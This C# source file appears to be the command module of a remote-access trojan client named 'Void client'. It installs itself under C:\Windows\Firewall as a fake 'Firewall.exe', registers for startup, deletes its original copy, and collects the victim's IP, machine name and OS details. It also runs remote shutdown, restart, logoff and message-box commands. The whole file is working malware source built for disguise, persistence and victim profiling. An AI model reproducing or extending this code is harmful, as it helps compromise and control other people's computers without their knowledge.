using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Void_client.Libs
{
    class Commands
    {
        //installs the client onto the user's computer as a fake file called "Firewall.exe"
        public static void Install()
        {
            DirectoryInfo installDir = Directory.CreateDirectory(@"C:\Windows\Firewall");

            string exePath = installDir.FullName + @"\Firewall.exe";

            byte[] bytes = File.ReadAllBytes(Application.ExecutablePath.ToString());

            FileStream creation = File.Create(exePath);
            creation.Close();

            File.WriteAllBytes(exePath, bytes);

            Registry.AddToStartup(exePath);

            Process.Start(exePath);

            Task.Run(() =>
            {
                Process.Start("cmd.exe", $"/C Del {Application.ExecutablePath.ToString()}");
                Environment.Exit(0);
            });
        }

        //just uninstalls the client
        public static void Uninstall()
        {
            Registry.RemoveFromStartup();

            Task.Run(() =>
            {
                Process.Start("cmd.exe", $"/C Del {Application.ExecutablePath.ToString()}");
                Environment.Exit(0);
            });
        }

        //gets all the information
        public static string GiveInformation()
        {
            try
            {
                return $"{InfoGathering.GetIP()}|{InfoGathering.GetMachineName()}|{Settings.PORT.ToString()}|{InfoGathering.GetWinVersion()}|{InfoGathering.GetBits()}|{Settings.ISAUTOINSTALL}";
            }
            catch (Exception)
            {
                return "failed";
            }
        }

        //pc commands
        public static void PC(string command)
        {
            switch (command)
            {
                case "shutdown":
                    Libs.PC.Shutdown();
                    break;
                case "restart":
                    Libs.PC.Restart();
                    break;
                case "logoff":
                    Libs.PC.LogOff();
                    break;
            }
        }

        //shows a message box to the user
        public static void ShowMsgBox(string[] information)
        {
            MessageBoxIcon icon;

            switch (information[3])
            {
                case "Error":
                    icon = MessageBoxIcon.Error;
                    break;
                case "Information":
                    icon = MessageBoxIcon.Information;
                    break;
                case "Question":
                    icon = MessageBoxIcon.Question;
                    break;
                case "Warning":
                    icon = MessageBoxIcon.Warning;
                    break;
                default:
                    icon = MessageBoxIcon.None;
                    break;
            }

            MessageBox.Show(information[2], information[1], MessageBoxButtons.OK, icon);
        }
    }
}